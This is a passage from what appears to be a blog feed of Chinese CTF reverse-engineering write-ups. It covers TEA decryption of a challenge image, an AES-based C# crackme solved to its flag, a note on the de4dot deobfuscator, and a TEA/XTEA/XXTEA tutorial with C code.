class="keyword">int</span>* v, <span class="keyword">int</span>* k)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">int</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v[<span class="number">14656</span>];</span><br><span class="line">    <span class="keyword">int</span> k[<span class="number">4</span>]=&#123;<span class="number">0x67616C66</span>, <span class="number">0x6B61667B</span>, <span class="number">0x6C665F65</span>, <span class="number">0x7D216761</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./tea.png.out&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(&amp;v, <span class="number">4</span>, <span class="number">14656</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">14656</span>;i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./tea.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;v, <span class="number">4</span>, <span class="number">14656</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/28/DASCTF/tea.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf</title>
      <link href="/2021/03/28/Nepctf/"/>
      <url>/2021/03/28/Nepctf/</url>
      
        <content type="html"><![CDATA[<h1 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h1><a id="more"></a><p>⽤dnspy32位打开，可发现是aes加密<br>反编译代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace hardcsharp</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line">internal <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">AesClass aesClass = <span class="keyword">new</span> AesClass();</span><br><span class="line">string text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">string strB = </span><br><span class="line"><span class="string">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] array = <span class="keyword">new</span> <span class="keyword">byte</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, </span><br><span class="line"><span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;</span>);</span><br><span class="line">string text2 = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (text2.Length != <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text2.Substring(<span class="number">0</span>, <span class="number">4</span>) != <span class="string">&quot;Nep&#123;&quot;</span> || text2[<span class="number">36</span>] != <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += Convert.ToChar((<span class="keyword">int</span>)(array[i] ^ <span class="number">51</span>)).ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string.Compare(aesClass.AesEncrypt(text2, text), strB) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;wow, you pass it!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">AesEncrypt</span><span class="params">(string str, string key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (string.IsNullOrEmpty(str))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">byte</span>[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line"><span class="keyword">byte</span>[] array = <span class="keyword">new</span> RijndaelManaged</span><br><span class="line">&#123;</span><br><span class="line">Key = Encoding.UTF8.GetBytes(key),</span><br><span class="line">Mode = CipherMode.ECB,</span><br><span class="line">Padding = PaddingMode.PKCS7</span><br><span class="line">&#125;.CreateEncryptor().TransformFinalBlock(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line"><span class="keyword">return</span> Convert.ToBase64String(array, <span class="number">0</span>, array.Length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知AES模式为ECB，填充模式为PKCS7Padding<br>解出来密钥：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">32</span>]=&#123;<span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, </span><br><span class="line">    <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num[i]^=<span class="number">51</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,num[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>密钥：badbadwomen!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>在线解密</p><p><img src="/2021/03/28/Nepctf/1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;up_up_down_down_B_a_b_A_Nep_nep~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de4dot反混淆工具</title>
      <link href="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>找到下载好的文件所在的位置</p><a id="more"></a><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/1.png"></p><p>按住shift选择并右击，选择打开Powershell窗口</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/2.png"></p><p> 输入.\De4Dot [目标文件的路径]</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/4.png"></p><p>会生成一个名为：原文件名–cleaned.exe</p><p>去混淆前<br><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/5.png"></p><p>去混淆后</p><p><img src="/2021/03/28/de4dot%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%B7%A5%E5%85%B7/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喝茶吗</title>
      <link href="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/"/>
      <url>/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h1 id="一个神奇的加密"><a href="#一个神奇的加密" class="headerlink" title="一个神奇的加密"></a>一个神奇的加密</h1><a id="more"></a><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019">参考链接</a></p><h3 id="tea加密"><a href="#tea加密" class="headerlink" title="tea加密"></a>tea加密</h3><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫·惠勒与罗杰·尼达姆。这项技术最初于1994年提交给鲁汶的快速软件加密的研讨会上，并在该研讨会上演讲中首次发表。</p><p>在给出的代码中：加密使用的数据为2个32位无符号整数，密钥为4个32位无符号整数即密钥长度为128位<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/1.png"><br>算法实现：</p><p>C语言代码（需支持C99）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1347371722 925494771<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.020 s<br>Press any key to continue.</p></blockquote><h3 id="xtea加密"><a href="#xtea加密" class="headerlink" title="xtea加密"></a>xtea加密</h3><p>XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/2.png"><br>算法实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    decipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><blockquote><p>加密前原始数据：1 2<br>加密后的数据：1345390024 2801624574<br>解密后的数据：1 2</p><p>Process returned 0 (0x0)   execution time : 0.034 s<br>Press any key to continue.</p></blockquote><h3 id="xxtea加密"><a href="#xxtea加密" class="headerlink" title="xxtea加密"></a>xxtea加密</h3><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版 ，设计者是Roger Needham, David Wheeler<br>加密过程：<br><img src="/2021/03/20/%E5%96%9D%E8%8C%B6%E5%90%97/3.png"><br>算法实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 